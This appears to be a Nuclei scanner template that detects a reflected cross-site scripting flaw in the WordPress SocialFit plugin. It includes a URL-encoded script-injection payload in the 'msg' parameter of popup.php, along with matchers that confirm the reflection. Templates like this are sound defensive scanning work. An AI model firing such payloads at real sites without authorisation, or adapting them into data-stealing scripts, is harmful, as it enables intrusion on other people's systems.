id: wp-socialfit-xss

info:
  name: WordPress SocialFit - Cross-Site Scripting
  author: daffainfo
  severity: high
  description: |
    WordPress SocialFit is vulnerable to a cross-site scripting vulnerability via the 'msg' parameter because it fails to properly sanitize user-supplied input.
  reference:
    - https://www.exploit-db.com/exploits/37481
  classification:
    cpe: cpe:2.3:a:wp-socialfit:wp-socialfit:*:*:*:*:*:*:*:*
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
  metadata:
    verified: true
    max-request: 1
    publicwww-query: "/wp-content/plugins/socialfit"
    vendor: wp-socialfit
    product: wp-socialfit
  tags: wordpress,wp,xss,wp-plugin,edb,vuln

http:
  - method: GET
    path:
      - '{{BaseURL}}/wp-content/plugins/socialfit/popup.php?service=googleplus&msg=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'

    matchers-condition: and
    matchers:
      - type: word
        name: wp-socialfit
        cpe: cpe:2.3:a:wp-socialfit:wp-socialfit:*:*:*:*:*:*:*:*
        part: body
        words:
          - '</script><script>alert(document.domain)</script>'

      - type: word
        name: wp-socialfit-2
        cpe: cpe:2.3:a:wp-socialfit:wp-socialfit:*:*:*:*:*:*:*:*
        part: body
        words:
          - '<title>Google+'
          - 'window.___gcfg'
        condition: or

      - type: word
        name: wp-socialfit-3
        cpe: cpe:2.3:a:wp-socialfit:wp-socialfit:*:*:*:*:*:*:*:*
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
